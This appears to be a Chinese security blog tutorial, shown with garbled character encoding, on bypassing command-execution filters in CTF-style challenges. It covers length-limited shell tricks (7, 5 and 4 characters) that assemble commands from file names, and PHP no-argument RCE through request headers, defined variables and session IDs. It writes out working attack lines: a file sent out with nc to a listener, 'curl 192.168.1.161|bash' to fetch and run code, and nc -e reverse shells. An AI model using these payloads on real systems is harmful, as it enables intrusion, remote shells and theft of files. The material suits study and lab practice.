<p>è¯»å–æ–‡ä»¶æŒ‡å®šè¡Œçš„æŒ‡å®šä½ç½®çš„å­—ç¬¦</p>
<p>ç›¸å…³å‘½ä»¤</p>
<p><strong>1.sleep</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 5  5ç§’åè¿”å›ç»“æœ</span><br></pre></td></tr></table></figure>

<p><strong>2.cat+awk</strong> NR     awké€è¡Œè·å–æ•°æ®  </p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241956456.png" alt="image-20240424195618422" loading="lazy"></p>
<p><strong>3.cut -c</strong>     cut å‘½ä»¤é€åˆ—è·å–å˜ä¸ªå­—ç¬¦</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241958280.png" alt="image-20240424195850245" loading="lazy"></p>
<p><strong>4.ifåˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡Œ</strong></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404241959619.png" alt="image-20240424195930570" loading="lazy"></p>
<p>5.<strong>è„šæœ¬</strong></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251351441.png" alt="image-20240425135138314" loading="lazy"></p>
<h3 id="é•¿åº¦è¿‡æ»¤ç»•è¿‡"><a href="#é•¿åº¦è¿‡æ»¤ç»•è¿‡" class="headerlink" title="é•¿åº¦è¿‡æ»¤ç»•è¿‡"></a>é•¿åº¦è¿‡æ»¤ç»•è¿‡</h3><h4 id="ç›¸å…³å‘½ä»¤"><a href="#ç›¸å…³å‘½ä»¤" class="headerlink" title="ç›¸å…³å‘½ä»¤"></a><strong>ç›¸å…³å‘½ä»¤</strong></h4><h5 id="1-å’Œ-ç¬¦å·"><a href="#1-å’Œ-ç¬¦å·" class="headerlink" title="1.&gt;å’Œ&gt;&gt;ç¬¦å·"></a><strong>1.&gt;å’Œ&gt;&gt;ç¬¦å·</strong></h5><p>1ï¼‰<strong>é€šè¿‡&gt;æ¥åˆ›å»ºæ–‡ä»¶</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo benben&gt;a</span><br></pre></td></tr></table></figure>

<p>åˆ›å»ºæ–‡ä»¶aï¼Œ</p>
<p>å¹¶æŠŠå­—ç¬¦ä¸²â€˜benbenâ€™å†™å…¥åˆ°æ–‡ä»¶aé‡Œé¢ï¼›</p>
<p><strong>æ³¨æ„</strong>ï¼šé€šè¿‡&gt;æ¥è®²å‘½ä»¤æ‰§è¡Œç»“æœå†™å…¥æ–‡ä»¶ä¼šè¦†ç›–æ‰æ–‡ä»¶åŸæœ¬çš„å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo dazhuang&gt;a</span><br></pre></td></tr></table></figure>

<p>aä¸­çš„å†…å®¹å°±ä¼šç”±benbenå˜ä¸ºdazhuang</p>
<p>å•ç‹¬ä½¿ç”¨&gt;,ä¼šç›´æ¥åˆ›å»ºæ–‡ä»¶b</p>
<p>2ï¼‰<strong>é€šè¿‡&gt;&gt;æ¥è¿½åŠ å†…å®¹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo benben&gt;&gt;a</span><br></pre></td></tr></table></figure>

<p>åœ¨åŸæœ¬æ–‡ä»¶å†…å®¹åé¢è¿½åŠ â€œbenbenâ€</p>
<h5 id="2-å‘½ä»¤æ¢è¡Œ"><a href="#2-å‘½ä»¤æ¢è¡Œ" class="headerlink" title="2.å‘½ä»¤æ¢è¡Œ"></a><strong>2.å‘½ä»¤æ¢è¡Œ</strong></h5><p>åœ¨æ²¡æœ‰å†™å®Œçš„å‘½ä»¤åé¢åŠ â€œ\â€ï¼Œå¯ä»¥å°†ä¸€æ¡å‘½ä»¤å†™åœ¨å¤šè¡Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#cat a</span><br><span class="line"></span><br><span class="line">#c\</span><br><span class="line">a\</span><br><span class="line">t\</span><br><span class="line">a</span><br></pre></td></tr></table></figure>

<p>ç›¸å½“äº\æŠŠæ¢è¡Œçš„å‘½ä»¤è¿æ¥åˆ°ä¸€èµ·æ‰§è¡Œ</p>
<h5 id="3-ls-tå‘½ä»¤"><a href="#3-ls-tå‘½ä»¤" class="headerlink" title="3. ls -tå‘½ä»¤"></a><strong>3. ls -tå‘½ä»¤</strong></h5><p>å°†æ–‡ä»¶åæŒ‰ç…§æ—¶é—´é¡ºåºæ’åˆ—å‡ºæ¥ï¼ˆååˆ›å»ºçš„æ’åœ¨å‰é¢ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">a b c</span><br></pre></td></tr></table></figure>

<p>æŒ‰å­—æ¯é¡ºåºæ˜¾ç¤ºæ–‡ä»¶å</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls -t</span><br><span class="line">b c a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æŒ‰æ—¶é—´é¡ºåºæ˜¾ç¤ºæ–‡ä»¶åï¼ˆååˆ›å»ºçš„æ’åœ¨å‰é¢ï¼‰</p>
<p><em>åªèƒ½ç²¾ç¡®åˆ°ç§’</em></p>
<h5 id="4-ç»„åˆè¿ç”¨"><a href="#4-ç»„åˆè¿ç”¨" class="headerlink" title="4.ç»„åˆè¿ç”¨"></a><strong>4.ç»„åˆè¿ç”¨</strong></h5><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251416193.png" alt="image-20240425141609130" loading="lazy"></p>
<p><strong>æ‰§è¡Œæ–‡ä»¶æ–¹æ³•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.aæˆ–è€…sh a</span><br><span class="line">æ‰§è¡Œå‘½ä»¤ä»æ ‡å‡†è¾“å…¥è¯»å–æˆ–ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è¯»å–</span><br></pre></td></tr></table></figure>



<blockquote>
<p>å¯¹å‘½ä»¤é•¿åº¦æœ‰é™åˆ¶æ—¶</p>
<p>æŠŠä¸€äº›å¾ˆçŸ­çš„æ–‡ä»¶åæ‹¼æ¥æˆå¯æ‰§è¡Œå‘½ä»¤</p>
<p>&gt;åˆ›å»ºå¾ˆçŸ­çš„çš„æ–‡ä»¶å</p>
<p>ls -tæŒ‰æ—¶é—´é¡ºåºåˆ—å‡ºæ–‡ä»¶åï¼ŒæŒ‰è¡Œå‚¨å­˜</p>
<p>\è¿æ¥æ¢è¡Œå‘½ä»¤</p>
<p>shä»æ–‡ä»¶ä¸­è¯»å–å‘½ä»¤</p>
</blockquote>
<h5 id="5-diråŠ-å’Œrev"><a href="#5-diråŠ-å’Œrev" class="headerlink" title="5.diråŠ*å’Œrev"></a><strong>5.diråŠ*å’Œrev</strong></h5><p><strong>dir</strong>ï¼šåŸºæœ¬ä¸Šå’Œlsä¸€æ ·ï¼Œä½†æœ‰ä¸¤ä¸ªå¥½å¤„</p>
<p>ä¸€æ˜¯å¼€å¤´å­—æ¯æ˜¯dï¼Œè¿™ä½¿å¾—å®ƒåœ¨alphabeticalåºä¸­é å‰ï¼›</p>
<p>äºŒæ˜¯æŒ‰åˆ—è¾“å‡ºï¼Œä¸æ¢è¡Œ</p>
<p>*****:ç›¸å½“äº$(dir *)</p>
<p>æŠŠæ–‡ä»¶åç»„åˆåœ¨ä¸€èµ·å½“ä½œå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251436045.png" alt="image-20240425143604984" loading="lazy"></p>
<p><strong>rev</strong>ï¼šå¯ä»¥åè½¬æ–‡ä»¶çš„æ¯ä¸€è¡Œå†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat flag</span><br><span class="line">123456</span><br><span class="line"></span><br><span class="line">rev flag</span><br><span class="line">654321</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="é•¿åº¦é™åˆ¶ä¸º7çš„ç»•è¿‡æ–¹æ³•"><a href="#é•¿åº¦é™åˆ¶ä¸º7çš„ç»•è¿‡æ–¹æ³•" class="headerlink" title="é•¿åº¦é™åˆ¶ä¸º7çš„ç»•è¿‡æ–¹æ³•"></a>é•¿åº¦é™åˆ¶ä¸º7çš„ç»•è¿‡æ–¹æ³•</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251500945.png" alt="image-20240425150059857" loading="lazy"></p>
<p>æ€è·¯ï¼š1.å…ˆå¯»æ‰¾æœŸæœ›æ‰§è¡Œçš„å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag|nc 192.168.1.161 7777</span><br></pre></td></tr></table></figure>

<p>kailçš„ipåœ°å€192.168.1.161</p>
<p>ç›‘å¬ç«¯å£7777</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ–¹æ³•</span><br><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡cat flagå±•ç¤ºå†…å®¹ï¼Œå†é€šè¿‡ncåå¼¹ï¼Œæäº¤åˆ°192.168.1.161:777ï¼Œæœ€åé€šè¿‡ç›‘å¬ç«¯å£è·å¾—å†…å®¹</p>
<p>ç”¨ä»¥ä¸‹æ–¹æ³•è¿›è¡Œæ‹¼æ¥</p>
<blockquote>
<p>&gt;åˆ›å»ºå¾ˆçŸ­çš„çš„æ–‡ä»¶å</p>
<p>ls -tæŒ‰æ—¶é—´é¡ºåºåˆ—å‡ºæ–‡ä»¶åï¼ŒæŒ‰è¡Œå‚¨å­˜</p>
<p>\è¿æ¥æ¢è¡Œå‘½ä»¤</p>
<p>shä»æ–‡ä»¶ä¸­è¯»å–å‘½ä»¤</p>
</blockquote>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404251506528.png" alt="image-20240425150646487" loading="lazy"></p>
<p>æœ€åç”¨sh aæ‰§è¡Œå‘½ä»¤</p>
<p><strong>ncåå¼¹shell</strong></p>
<p><strong>åœ¨ Kali Linux ä¸Šç›‘å¬è¿æ¥</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp &lt;ç›‘å¬ç«¯å£&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>åœ¨ç›®æ ‡ä¸»æœºä¸Šå‘èµ·è¿æ¥è¯·æ±‚</strong></p>
<p>linux</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash &lt;kaliçš„IP&gt; &lt;kaliç›‘å¬ç«¯å£&gt;</span><br></pre></td></tr></table></figure>

<p>windows</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd.exe &lt;kaliçš„IP&gt; &lt;kaliç›‘å¬ç«¯å£&gt;</span><br></pre></td></tr></table></figure>



<hr>
<h4 id="é•¿åº¦é™åˆ¶ä¸º5çš„ç»•è¿‡æ–¹æ³•"><a href="#é•¿åº¦é™åˆ¶ä¸º5çš„ç»•è¿‡æ–¹æ³•" class="headerlink" title="é•¿åº¦é™åˆ¶ä¸º5çš„ç»•è¿‡æ–¹æ³•"></a>é•¿åº¦é™åˆ¶ä¸º5çš„ç»•è¿‡æ–¹æ³•</h4><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071406094.png" alt="image-20240507140631920" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ls -t&gt;a</span><br><span class="line">å­—ç¬¦ä¸²é•¿åº¦ä¸º7ï¼Œè¶…è¿‡é™åˆ¶5</span><br><span class="line"></span><br><span class="line">&gt;\ \\</span><br><span class="line">æ„é€ ç©ºæ ¼çš„å­—ç¬¦ä¸²é•¿åº¦æœ€å°‘ä¸º5ï¼Œè¶…è¿‡ä¸€ä¸ªç©ºæ ¼ä¾¿æ— æ³•æ„é€ </span><br><span class="line"></span><br><span class="line">é•¿åº¦é™åˆ¶ä¸º7æ—¶çš„å‘½ä»¤ä¸å†é€‚ç”¨</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271923282.png" alt="image-20240427192327068" loading="lazy"></p>
<p><strong>æ„å»ºå‘½ä»¤</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æœŸæœ›æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line">curl 192.168.1.161|bash</span><br></pre></td></tr></table></figure>

<p><strong>æ­¥éª¤ä¸€</strong>ï¼šæ„é€ ls-t&gt;y</p>
<p>lsé»˜è®¤æ’åºæ— æ³•æ­£å¸¸æ’å‡ºâ€œls\â€â€&quot;â€œ-t&quot;â€œ&gt;y&quot;</p>
<p>â€œls&quot;é»˜è®¤ä¼šæ’åœ¨æœ€åï¼Œæ— æ³•æ­£å¸¸æ‰§è¡Œå‘½ä»¤çš„</p>
<p>æ‰€ä»¥ï¼šæˆ‘ä»¬å…ˆåˆ›å»ºæ–‡ä»¶ls\</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ls\</span><br></pre></td></tr></table></figure>

<p>åœ¨åˆ›å»ºæ–‡ä»¶â€_â€ï¼Œå¹¶æŠŠâ€œls\â€å†™å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls&gt;_</span><br></pre></td></tr></table></figure>

<p>å†åˆ›å»ºå…¶ä»–æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;\ \\</span><br><span class="line">&gt;-t\\</span><br><span class="line">&gt;\&gt;y</span><br></pre></td></tr></table></figure>

<p>ç”¨&gt;&gt;æŠŠæ‰€æœ‰æ–‡ä»¶åè¿½åŠ åˆ°æ–‡ä»¶_</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls&gt;&gt;_</span><br></pre></td></tr></table></figure>

<p>æœ€åsh_æ‰§è¡Œæ–‡ä»¶_ä¸­çš„å†…å®¹ï¼Œå³åˆ›å»ºæ–‡ä»¶y</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh_</span><br></pre></td></tr></table></figure>

<p><strong>æ­¥éª¤äºŒï¼š</strong>åˆ†è§£å‘½ä»¤ï¼Œåˆ›å»ºæ–‡ä»¶</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404271953465.png" alt="image-20240427195355410" loading="lazy"></p>
<p><strong>æ­¥éª¤ä¸‰</strong>ï¼šæ‰§è¡Œè„šæœ¬sh</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh y</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå‘½ä»¤curl 192.168.1.161|bash</p>
<p>åå¼¹shell</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202404272001638.png" alt="image-20240427200103558" loading="lazy"></p>
<hr>
<h4 id="é•¿åº¦é™åˆ¶ä¸º4çš„ç»•è¿‡æ–¹æ³•"><a href="#é•¿åº¦é™åˆ¶ä¸º4çš„ç»•è¿‡æ–¹æ³•" class="headerlink" title="é•¿åº¦é™åˆ¶ä¸º4çš„ç»•è¿‡æ–¹æ³•"></a>é•¿åº¦é™åˆ¶ä¸º4çš„ç»•è¿‡æ–¹æ³•</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls&gt;&gt;_</span><br><span class="line">è¿½åŠ å‘½ä»¤é•¿åº¦æœ€å°‘ä¸º5ï¼Œè¶…è¿‡4ä¸ªï¼Œä¸å†é€‚ç”¨</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071410666.png" alt="image-20240507141056579" loading="lazy"></p>
<p>æ­¥éª¤ä¸€ï¼šæ„é€ ls -t&gt;g</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;g\;</span><br><span class="line">&gt;g\&gt;</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;sl</span><br><span class="line">&gt;dir</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;x</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¥éª¤äºŒï¼šæ„é€ ä¸€ä¸ªåå¼¹çš„shell</p>
<p>ipåœ°å€ç”¨16è¿›åˆ¶è¡¨ç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;ash</span><br><span class="line">&gt;b\</span><br><span class="line">&gt;\|\</span><br><span class="line">&gt;A1\</span><br><span class="line">&gt;01\</span><br><span class="line">&gt;A8\</span><br><span class="line">&gt;c0&gt;</span><br><span class="line">&gt;0x\</span><br><span class="line">&gt;\\</span><br><span class="line">&gt;rl\</span><br><span class="line">&gt;cu\</span><br><span class="line">sh x</span><br><span class="line">sh g</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¥éª¤ä¸‰ï¼šå¼€å¯http.serverç›‘å¬80ç«¯å£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#python -m http.server 80</span><br></pre></td></tr></table></figure>

<p>æ­¥éª¤å››ï¼šæ‰§è¡Œè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#python poc4.py</span><br></pre></td></tr></table></figure>

<h3 id="æ— å‚æ•°å‘½ä»¤æ‰§è¡Œè¯·æ±‚å¤´ç»•è¿‡"><a href="#æ— å‚æ•°å‘½ä»¤æ‰§è¡Œè¯·æ±‚å¤´ç»•è¿‡" class="headerlink" title="æ— å‚æ•°å‘½ä»¤æ‰§è¡Œè¯·æ±‚å¤´ç»•è¿‡"></a>æ— å‚æ•°å‘½ä»¤æ‰§è¡Œè¯·æ±‚å¤´ç»•è¿‡</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405071943478.png" alt="image-20240507194352410" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, $_GET[&#x27;exp&#x27;])</span><br><span class="line">åªè¦åœ¨expé‡ŒåŒ¹é…åˆ°[^\W]+\((?R)?\) åˆ™æ›¿æ¢ä¸ºç©º</span><br><span class="line"></span><br><span class="line">[^\W]+\((?R)?\)</span><br><span class="line">æ­£åˆ™è¡¨è¾¾å¼[^\W]åŒ¹é…å­—æ¯ã€æ•°å­—ã€ä¸‹åˆ’çº¿ï¼ˆå¦‚æœåœ¨æ–¹æ‹¬å·çš„å‰é¢å†™ä¸Šä¸€ä¸ª^,åˆ™ä»£è¡¨è¦æ±‚åŒ¹é…å‡ºäº†å°–å·åé¢åˆ—å‡ºçš„ä»¥å¤–çš„å­—ç¬¦ï¼‰</span><br><span class="line">[^\W]+\(?\)åŒ¹é…åˆ°â€˜a()â€™å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œä½†æ˜¯ï¼ˆï¼‰ä¸èƒ½å‡ºç°ä»»ä½•å‚æ•°</span><br><span class="line">(?R)ä»£è¡¨é€’å½’ï¼Œå³a(b(c()))éƒ½èƒ½åŒ¹é…åˆ°</span><br></pre></td></tr></table></figure>



<p><strong>HTTPè¯·æ±‚æ ‡å¤´</strong></p>
<p><strong>getallheaders()</strong></p>
<p>è·å–æ‰€æœ‰è¯·æ±‚æ ‡å¤´(è·ŸæŠ“åŒ…å†…å®¹æ˜¯åç€çš„)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(getallheaders());</span><br></pre></td></tr></table></figure>

<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405072009305.png" alt="image-20240507200954233" loading="lazy"></p>
<p>pos()æŠŠç¬¬ä¸€é¡¹å†…å®¹çš„å€¼æ˜¾ç¤ºå‡ºæ¥</p>
<p>æˆ–end()æŠŠæœ€åä¸€é¡¹å†…å®¹çš„å€¼æ˜¾ç¤ºå‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(pos(getallheaders())); posæ‹¿åˆ°çš„çš„getallheadersæ˜¾ç¤ºçš„ç¬¬ä¸€ä¸ª</span><br><span class="line">?code=print_r(end(getallheaders())); endæ‹¿åˆ°çš„çš„getallheadersæ˜¾ç¤ºçš„æœ€åä¸€ä¸ª</span><br></pre></td></tr></table></figure>

<p>æŠŠprint_ræ”¹ä¸ºevalå°±èƒ½æ‰§è¡Œå‘½ä»¤äº†</p>
<p><strong>apache_request_headers()</strong></p>
<p>åŠŸèƒ½ä¸getallheaders()ç›¸ä¼¼ï¼Œé€‚ç”¨äºapacheæœåŠ¡å™¨</p>
<hr>
<h3 id="æ— å‚æ•°å…¨å±€å˜é‡RCE"><a href="#æ— å‚æ•°å…¨å±€å˜é‡RCE" class="headerlink" title="æ— å‚æ•°å…¨å±€å˜é‡RCE"></a>æ— å‚æ•°å…¨å±€å˜é‡RCE</h3><p>get_defined_vars()</p>
<p>è¿”å›æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å€¼æ‰€ç»„æˆçš„æ•°ç»„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(get_defined_vars));</span><br><span class="line">è¿”å›æ•°ç»„é¡ºåºä¸ºGET-&gt;POST-&gt;COOKIE-&gt;FILES</span><br><span class="line">?code=print_r(end(pos(get_defined_vars())));&amp;cmd=system(&#x27;ls&#x27;);</span><br><span class="line">&amp;åŠ å…¥æƒ³è¦è·å–çš„å‘½ä»¤</span><br><span class="line">æŠŠprint_ræ¢æˆevalï¼Œassertå³å¯</span><br><span class="line">endè·å–GETçš„æœ€åä¸€é¡¹cmdçš„å€¼system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(current(localeconv())));</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">localeconv() å‡½æ•°è¿”å›å½“å‰è®¾ç½®çš„åœ°åŒºçš„æ ¼å¼åŒ–ä¿¡æ¯ï¼ŒåŒ…æ‹¬è´§å¸ç¬¦å·ã€å°æ•°ç‚¹ç¬¦å·ç­‰ã€‚å®ƒè¿”å›ä¸€ä¸ªæ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº†ä¸å½“å‰åœ°åŒºç›¸å…³çš„æ ¼å¼åŒ–å‚æ•°ï¼Œè¯¥å‡½æ•°è¿”å›çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼é€šå¸¸æ˜¯å°æ•°ç‚¹ â€œ.â€ ã€‚</span><br><span class="line"></span><br><span class="line">current() å‡½æ•°ç”¨äºè·å–æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºè·å– localeconv() å‡½æ•°è¿”å›çš„æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å€¼ï¼Œå³ä¸€ä¸ªå°æ•°ç‚¹ã€‚</span><br><span class="line"></span><br><span class="line">scandir() å‡½æ•°ç”¨äºè·å–æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ã€‚å®ƒæ¥å—ä¸€ä¸ªè·¯å¾„ä½œä¸ºå‚æ•°ï¼Œå¹¶è¿”å›ä¸€ä¸ªåŒ…å«æŒ‡å®šç›®å½•ä¸­æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„æ•°ç»„ã€‚scandir(&quot;.&quot;) è¡¨ç¤ºè·å–å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨ã€‚</span><br><span class="line"></span><br><span class="line">æœ€åä½¿ç”¨ var_dump() å‡½æ•°å°†è¯¥åˆ—è¡¨è¾“å‡ºåˆ°é¡µé¢ä¸Šã€‚</span><br></pre></td></tr></table></figure>



<h3 id="æ— å‚æ•°å‘½ä»¤æ‰§è¡Œsession"><a href="#æ— å‚æ•°å‘½ä»¤æ‰§è¡Œsession" class="headerlink" title="æ— å‚æ•°å‘½ä»¤æ‰§è¡Œsession"></a>æ— å‚æ•°å‘½ä»¤æ‰§è¡Œsession</h3><p>ä½¿ç”¨æ¡ä»¶ï¼šphp7ä»¥ä¸‹</p>
<p>session_start()</p>
<p>å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å›trueï¼Œåä¹‹è¿”å›false</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(session_start());</span><br><span class="line"></span><br><span class="line">è¿”å›1</span><br><span class="line"></span><br><span class="line">?code=print_r(session_id(session_start()))</span><br><span class="line">è¿”å›PHPSESSIDçš„å€¼</span><br><span class="line">å¯ä»¥é€šè¿‡bpä¿®æ”¹å®ƒ</span><br></pre></td></tr></table></figure>

<p>print_rä¿®æ”¹ä¸ºshow_source(session_id(session_start))</p>
<p>ç”¨show_sourceè¯»å–flagæ–‡ä»¶æºä»£ç </p>
<p>ä¿®æ”¹å¤–éƒ¨å‡½æ•°ä¸ºeval()</p>
<p>ä¿®æ”¹PHPSESSIDä¸ºâ€˜phpinfo();â€™</p>
<p>ä½†æ— æ³•ç›´æ¥æ‰§è¡Œï¼Œéœ€è¦æŠŠphpinfo();æ”¹ä¸ºhexç¼–ç åå†ç”¨hex2bin()å‡½æ•°å°†16è¿›åˆ¶è½¬ä¸º2è¿›åˆ¶ï¼Œæ‰å¯ç”¨evalæ‰§è¡Œ</p>
